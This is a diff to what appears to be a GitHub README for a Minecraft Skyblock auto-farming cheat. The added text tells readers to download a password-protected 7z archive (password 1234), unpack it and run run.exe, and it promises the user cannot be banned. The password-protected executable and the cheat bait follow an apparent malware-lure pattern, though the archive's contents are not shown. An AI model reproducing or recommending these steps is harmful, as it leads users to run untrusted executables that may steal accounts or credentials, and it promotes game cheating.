@@ -11,3 +11,17 @@
 - :zap: This software will help you engage in afk farming for which you cannot get blocked
 
 - :mailbox:How download (pass: 1234): <a href = "https://github.com/qurwes/skyblock-auto-farm/releases/download/skyblock/Software.7z">download</a>
+
+<h1>
+<div align="center">
+  Instructions
+  <img src="https://media.giphy.com/media/CaiVJuZGvR8HK/giphy.gif?cid=790b7611wsvwgdxby8hrha4ifzdbanbwhjfo0exsi1zpig3e&ep=v1_gifs_search&rid=giphy.gif&ct=g" width="30px"/>
+</h1>
+</div>
+  
+- download archive
+- unearth the archive (password 1234)
+- run minecraft and join skyblock
+- open run.exe
+
+- (pass: 1234): <a href = "https://github.com/qurwes/skyblock-auto-farm/releases/download/skyblock/Software.7z">download</a>
